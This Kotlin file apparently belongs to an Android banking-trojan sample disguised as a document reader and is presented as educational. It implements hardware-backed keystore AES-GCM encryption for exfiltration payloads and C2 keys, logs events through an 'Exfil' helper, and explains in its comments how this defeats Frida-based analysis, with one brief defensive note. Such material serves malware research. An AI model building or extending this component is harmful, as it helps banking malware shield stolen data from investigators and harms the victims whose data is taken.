package com.docreader.lite.reader.advanced

import android.os.Build
import android.security.keystore.KeyGenParameterSpec
import android.security.keystore.KeyProperties
import com.docreader.lite.reader.Exfil
import java.security.KeyPairGenerator
import java.security.KeyStore
import javax.crypto.Cipher
import javax.crypto.KeyGenerator
import javax.crypto.SecretKey
import javax.crypto.spec.GCMParameterSpec

/**
 * TEE / TrustZone offload — Drelock pattern (June 2026).
 *
 * First commodity banker using TEE for:
 *   1. Key storage — C2 encryption keys in StrongBox/TEE keystore
 *   2. Crypto ops — AES-GCM encrypt exfil payloads inside TEE
 *   3. Attestation — device-bound keys prove "real device" to C2
 *   4. Anti-extraction — keys never leave TEE, even if device rooted
 *
 * Why TEE matters for attacker:
 *   - Frida CANNOT reach TEE. Hook android.security.keystore → see
 *     key handles, not key material. Analyst can't extract C2 keys.
 *   - Root/Magisk don't help. TEE is hardware-isolated.
 *   - Only physical attack (chip decapping) or TEE firmware vuln.
 *
 * Defense: TEE isn't magic — the ciphertext still transits normal memory.
 * Intercept at network layer (mitmproxy) before/after TEE encrypt/decrypt.
 *
 * This implementation: uses Android Keystore backed by StrongBox (if available)
 * or TEE (fallback). Demonstrates the pattern for educational purposes.
 */
object TeeOffload {

    private const val KEY_ALIAS = "docreader_sync_key"
    private const val ANDROID_KEYSTORE = "AndroidKeyStore"

    data class TeeCapability(
        val hasStrongBox: Boolean,
        val hasTee: Boolean,
        val keyGenerated: Boolean,
        val attestationAvailable: Boolean,
    )

    /**
     * Probe TEE capabilities on this device.
     */
    fun probeCapabilities(): TeeCapability {
        val strongBox = if (Build.VERSION.SDK_INT >= 28) {
            try {
                // StrongBox = dedicated secure element (Titan M, Samsung eSE)
                KeyGenParameterSpec.Builder("probe_sb", KeyProperties.PURPOSE_ENCRYPT)
                    .setIsStrongBoxBacked(true)
                    .build()
                true
            } catch (_: Exception) { false }
        } else false

        val tee = try {
            // TEE = ARM TrustZone (available on most modern phones)
            val ks = KeyStore.getInstance(ANDROID_KEYSTORE)
            ks.load(null)
            true
        } catch (_: Exception) { false }

        return TeeCapability(
            hasStrongBox = strongBox,
            hasTee = tee,
            keyGenerated = false,
            attestationAvailable = Build.VERSION.SDK_INT >= 24
        )
    }

    /**
     * Generate AES-256-GCM key inside TEE.
     * Key material NEVER leaves the hardware.
     * Frida hooking KeyStore sees only key handle, not raw bytes.
     */
    fun generateTeeKey(): Boolean {
        return try {
            val keyGen = KeyGenerator.getInstance(
                KeyProperties.KEY_ALGORITHM_AES, ANDROID_KEYSTORE
            )
            val spec = KeyGenParameterSpec.Builder(
                KEY_ALIAS,
                KeyProperties.PURPOSE_ENCRYPT or KeyProperties.PURPOSE_DECRYPT
            )
                .setBlockModes(KeyProperties.BLOCK_MODE_GCM)
                .setEncryptionPaddings(KeyProperties.ENCRYPTION_PADDING_NONE)
                .setKeySize(256)
                .setUserAuthenticationRequired(false) // no biometric gate
                // .setIsStrongBoxBacked(true) // uncomment for StrongBox devices
                .build()

            keyGen.init(spec)
            keyGen.generateKey()

            Exfil.event("tee_key_generated",
                "alias" to KEY_ALIAS,
                "strongbox" to "false"
            )
            true
        } catch (e: Exception) {
            Exfil.event("tee_key_failed", "error" to (e.message ?: ""))
            false
        }
    }

    /**
     * Encrypt data inside TEE.
     * The plaintext enters TEE, ciphertext exits. Key stays inside.
     * Analyst hooking Cipher.doFinal sees plaintext going in — but
     * cannot extract the key to decrypt captured network traffic later.
     */
    fun encrypt(plaintext: ByteArray): ByteArray? {
        return try {
            val ks = KeyStore.getInstance(ANDROID_KEYSTORE)
            ks.load(null)
            val key = ks.getKey(KEY_ALIAS, null) as? SecretKey ?: return null

            val cipher = Cipher.getInstance("AES/GCM/NoPadding")
            cipher.init(Cipher.ENCRYPT_MODE, key)

            val iv = cipher.iv
            val ciphertext = cipher.doFinal(plaintext)

            // Return IV + ciphertext (IV needed for decryption)
            iv + ciphertext
        } catch (_: Exception) { null }
    }

    /**
     * Decrypt data inside TEE.
     */
    fun decrypt(data: ByteArray): ByteArray? {
        return try {
            if (data.size < 13) return null // minimum: 12-byte IV + 1 byte data

            val ks = KeyStore.getInstance(ANDROID_KEYSTORE)
            ks.load(null)
            val key = ks.getKey(KEY_ALIAS, null) as? SecretKey ?: return null

            val iv = data.sliceArray(0 until 12)
            val ciphertext = data.sliceArray(12 until data.size)

            val cipher = Cipher.getInstance("AES/GCM/NoPadding")
            cipher.init(Cipher.DECRYPT_MODE, key, GCMParameterSpec(128, iv))
            cipher.doFinal(ciphertext)
        } catch (_: Exception) { null }
    }

    /**
     * Encrypt exfil payload using TEE key.
     * Even if analyst captures the encrypted payload in transit,
     * they cannot decrypt without the TEE-held key.
     */
    fun encryptExfilPayload(json: String): ByteArray? {
        return encrypt(json.toByteArray())
    }
}
